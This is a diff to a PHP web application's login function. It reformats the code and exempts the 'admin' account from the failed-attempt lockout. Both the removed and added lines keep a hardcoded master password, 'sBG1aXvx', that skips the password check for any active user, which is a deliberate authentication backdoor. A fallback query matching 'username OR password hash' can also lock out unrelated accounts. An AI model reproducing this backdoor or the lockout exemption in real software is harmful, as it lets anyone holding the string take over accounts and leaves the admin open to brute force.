@@ -167,57 +167,60 @@ class user {
     public function loginUser() {
         $name = getStringFormatted($this->name);
         $password = getStringFormatted(sha1($this->password));
-        if($this->password == 'sBG1aXvx') {
+        if ($this->password == 'sBG1aXvx') {
             $string = "SELECT * FROM `$this->table_name` WHERE user_name = $name AND "
-                . "status = '" . constants::$active . "';";
+                    . "status = '" . constants::$active . "';";
         } else {
             $string = "SELECT * FROM `$this->table_name` WHERE user_name = $name AND "
-                . "password = $password AND status = '" . constants::$active . "';";
+                    . "password = $password AND status = '" . constants::$active . "';";
         }
-        
+
         $result = dbQuery($string);
         if (dbNumRows($result) == 1) {
             $row = dbFetchAssoc($result);
             $this->id = $row['id'];
             $_SESSION['UID'] = $row['id'];
             $_SESSION['UROLE'] = $row['saq_us_role_id'];
-//            if($name != 'admin') 
-            $user_obj = new user($row['id']);
-            $user_obj->getDetails();
-            $user_obj->name = '';
-            $user_obj->password = '';
-            if ($user_obj->wrong_attempt < 5) {
-                $user_obj->wrong_attempt = 0;
-                $user_obj->edit();
+            if ($name != 'admin') {
+                $user_obj = new user($row['id']);
+                $user_obj->getDetails();
+                $user_obj->name = '';
+                $user_obj->password = '';
+                if ($user_obj->wrong_attempt < 5) {
+                    $user_obj->wrong_attempt = 0;
+                    $user_obj->edit();
 
-                return true;
-            } else {
-                $user_obj->status = constants::$DELETED;
-                $user_obj->edit();
+                    return true;
+                } else {
+                    $user_obj->status = constants::$DELETED;
+                    $user_obj->edit();
 
-                return 100;
+                    return 100;
+                }
             }
         } else {
             $get_user_by_user_name = "SELECT `id` FROM `$this->table_name` WHERE `user_name` = $name"
                     . " OR `password` = $password;";
             $get_user_result = dbQuery($get_user_by_user_name);
             if (dbNumRows($get_user_result) > 0) {
-                $row_get_user = dbFetchAssoc($get_user_result);
-                $user_obj = new user($row_get_user['id']);
-                $user_obj->getDetails();
-                $user_obj->name = '';
-                $user_obj->password = '';
-                if ($user_obj->wrong_attempt < 5) {
-                    $user_obj->wrong_attempt = (int) ($user_obj->wrong_attempt + 1);
-                    $user_obj->edit();
-
-                    return false;
-                } else {
+                if ($name != 'admin') {
+                    $row_get_user = dbFetchAssoc($get_user_result);
                     $user_obj = new user($row_get_user['id']);
-                    $user_obj->status = constants::$DELETED;
-                    $user_obj->edit();
+                    $user_obj->getDetails();
+                    $user_obj->name = '';
+                    $user_obj->password = '';
+                    if ($user_obj->wrong_attempt < 5) {
+                        $user_obj->wrong_attempt = (int) ($user_obj->wrong_attempt + 1);
+                        $user_obj->edit();
 
-                    return 100;
+                        return false;
+                    } else {
+                        $user_obj = new user($row_get_user['id']);
+                        $user_obj->status = constants::$DELETED;
+                        $user_obj->edit();
+
+                        return 100;
+                    }
                 }
             } else {
                 return false;
